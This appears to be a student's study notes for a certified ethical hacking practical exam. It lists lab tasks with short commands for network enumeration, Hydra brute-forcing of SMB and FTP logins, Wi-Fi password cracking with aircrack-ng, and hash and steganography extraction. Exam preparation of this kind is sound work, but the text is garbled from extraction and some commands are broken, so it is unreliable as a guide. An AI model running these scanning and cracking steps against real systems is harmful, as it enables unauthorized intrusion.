 MQTT: IoT Question: -> import it into the wireshark and apply the mqtt filter
 1- NetBios enum using windows- in cmd type- $nbtstat -a 10.10.10.10 (-a
 displays NEtBIOS name table)
 2- NetBios enum using nmap- $nmap -sV -v script nbstat.nse 10.10.10.16
 3- SNMP enum using nmap-  $nmap -sU -p 161 10.10.10.10 (-p 161 is port for
 SNMP)
 4- DNS recon/enum-  $dnsrecon -d 
.google.com -z
 5- FTP enum using nmap-  $nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- $enum4linux -u martin -p apple -n 
10.10.10.10 (all info)
 Important:
 First take a good look of all question and try to remember all ports which are presented in the
 question, and than start an nmap scan with these ports.
 1. FQDN of the Domain Controller
nmap -p 389,636 -sC *ldap* -sV -T4 -v -oG result.txt IP/CIDR 
nmap 
script smb-os-discovery IP/24 oG 
# Also I can use nslookup to resolve the FQDN like DNS by giving just
 nslookup IP
 2. Find WampServer
 nmap -p 80,443 IP/CIDR
 3. find and crack smb service.
 nmap -p 139,445 -oG smb-ip.txt IP/CIDR
 hydra -L ~/users/list -P ~/pass/list IP smb
 4. An insider attack has been identified in one of the employees mobile device in
 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain
 malicious elf files stored in a folder "Scan". Perform deep scan on the elf files and obtain
 the last 4 digits of SHA 384 hash of the file with highest entropy value.
 Identify the mobile device: Use tools like `nbtscan` or `nmblookup` to
 identify the mobile devices in the network.
 $ nbtscan -r 192.168.0.0/24
 $ nmap -p 5555 -sV -sS 192.168.0.0/24
 Perform deep scan on the ELF files: T
 o analyze the ELF files, use tools like `file`, `strings`, and `readelf`.
 These tools can provide information about the file type, sections, and
 symbols, as well as the contents of the files.
 $file <filename>
 $strings <filename>
 $readelf -a <filename>
 # for multiple files
 $ for f in *; do file $f | grep -q "ELF executable" 
echo $f; done
 Calculate entropy values: To find the file with the highest entropy value, you
 can use the `ent` command or a similar tool to calculate the entropy of each
 ELF file.
 $ent file_name
Calculate 384 Hash of the ELF:
 $shasum -a 384 file_name
 Finally obtain the last 4 digit from the hash:
 $shasum -a 384 <filename> | awk '{print $1}' | cut -d' ' -f2 | rev | cut -c 1
4 | rev
 5. Perform a vulnerability scan for the host with IP address 172.20.0.16 What is the severity
 score of a vulnerability the indicates the 
End of Life of a web development language
 platform?
 $sudo systemctl start nessus
 Open a web browser and navigate to `https localhost:8834`login in nessus and
 start a new scan.
 6. Exploit a remote login and command-line execution application on a Linux target in the
 192.168.0.0/24 subnet to access a sensitive file, NetworkPass.txt Enter the content in the
 file as answer.
 #check for ssh and telnet vulnerbilities
 7. Use "Imagination" if you are stuck. | STEGNO
 openstego 
steghide extract -sf file_name
 8. ftp Bruteforce
 hydra -P pass/list -L User/list IP ftp
 9. You used shoulder surfing to identify the usernames and password of a user on the
 Ubuntu machine in the 192.168.0.0/24 network, that is, smith and Linux123. Access the
 Machine, Perform vertical privilege escalation to that of a root user, and enter the content
 of the imroot.txt file as the answer. | PrivEsc
10. During as assignment, an incident responder has retained a suspicious executable file
 "die-another-da" Your task as a malware analyst is to find the executable's Entry point
 (Address). The file is in the C:\Users\Admin\Documents directory in the "EH Workstation 
2" machines.
 # in windows environment we can use DIE tool to identify Entry point adress or
 we can also see the entropy value, also we can extract strings from the file
 #To find the entry point of the "die-another-da" executable file, you can use
 the `readelf` command if you have access to a Linux system, or you can use a
 tool like PEview if you are using a Windows system.
 $ readelf -h die-another-da
 Entry point address:               
Start of program headers:          
Start of section headers:          
Flags:                             
Size of this header:               
0x80483d0
 52 (bytes into file)
 564 (bytes into file)
 0x0
 64 (bytes)
 In windows:
 1. Open PEview and open the "die-another-da" file.
 2. In the "File Information" section, look for the "Entry Point" field. This
 will give you the address of the entry point for the executable.
 11. You are investigating a massive DDoS attack launched against a target at 10.10.1.10.
 Identify the attacking IP address that sent most packets to the victim machine. The
 network capture file "attack-traffic.pcapng" is saved in the Documents folder of the "EH
 Workstation - 1" (ParrotSecurity) machine. | Wireshark
 Wireshark static  
end point
 12. Perform the SQL injection attack on your target web application cinema.cehorg.com and
 extract the password of a user Sarah. You have already registered on the website with
 credentials Karen/computer.
 13. Exploit the web application available at 
www.cehorg.com and enter the flag's value at the
 page with page_id=84.
14. Perform vulnerability research and exploit the web application training.cehorg.com,
 available at 192.168.0.64. Locate the Flag.txt file and enter its content as the answer.
 15. Perform SQL injection attack on a web application cybersec.cehorg.com, available at
 172.20.0.22. Find the value in the Flag column in one of the DB tables and enter it as the
 answer.
 16. A file named Hast.txt has been uploaded through DVWA (
 http://172.20.0.16:8080/DVWA).
 The file is located in the "C:\wamp64\www\DVWA\hackable\uploads" directory. Access the
 file and crack the MD5 hash to reveal the original message. Enter the decrypted message
 as the answer. You can log into the DVWA using the credentials admin/passwd.
 17. Analyse the traffic capture from an IoT network located in the Documents folder of the "EH
 Workstation - 1" (ParrotSecurity) machine, identify the packet with IoT Publish Message,
 and enter the message length as the answer.
 wireshark  
search for mqtt packets these packetes releted to Iot Devices
 18. Your organization suspects the presence of a rogue AP in the vicinity. You are tasked with
 cracking the wireless encryption, connecting to the network and setting up a honeypot.
 The airdump-ng tool has been used, and the Wi-Fi traffic capture named
 "WirelessCapture.cap" is located in the Documents folder in the “EH Workstation - 1"
 (ParrotSecurity) machine. Crack the wireless encryption and identify the Wi-Fi password. |
 "Crack WiFi password using pcap file"
 aircrack-ng WirelessCapture.cap
 aircrack-ng WirelessCapture.cap -w hash_password
 19. A disgruntled ex-employee has hidden a server access code in a Windows machine in the
 192.168.0.0/24 subnet. You can not physically access the target machine. but you know
 that the organization administration purpose. Your task is to retrieve the "sa_code.txt" file
 from the target machine and enter the string in the file as the answer.
20.  A disgruntled employee of your target organization has stolen the company's trade secrets
 and encrypted them using VeraCrypt. The VeraCrypt volume file "Secret" is stored on the
 C: drive of the "EH Workstation - 2" machine. The password to access the volume has
 been hashed and saved in the file Key2Secret.txt located in the Documents folder in the
 "EH Workstation - 1" (ParrotSecurity) machine. As an ethical hacker working with the
 company. you need to decrypt the hash in the with the company. you need to decrypt the
 hash in the Key2Secret.txt file, access the VeraCrypt volume, and find the secret code in
 the file named Confindential.txt.
 # first crack the hash of the "Key2Secret.txt" file which gives me the
 Password to decrypt the veracrypt encrypted file. then open veracrypt select
 Volume file "Secret" click on the mount button and enter the password. 
Using VeraCrypt GUI:
 1. Select Encrypted Volume:
 In the VeraCrypt main window, click on the "Select File" button to choose the
 encrypted volume file.
 2. Mount Volume:
 After selecting the volume file, click on the "Mount" button.
 3. Enter Password:
 Enter the password associated with the encrypted volume when prompted. If you are
 using a keyfile, select it as well.
 4. Select Mount Point:
 Choose a drive letter or an empty folder as the mount point for the decrypted volume.
 Click "OK" to proceed.
 5. Access the Decrypted Volume:
 Once the volume is successfully mounted, you can access it through the assigned
 drive letter or the chosen mount point. The contents of the volume will be accessible
 as if it were a regular drive
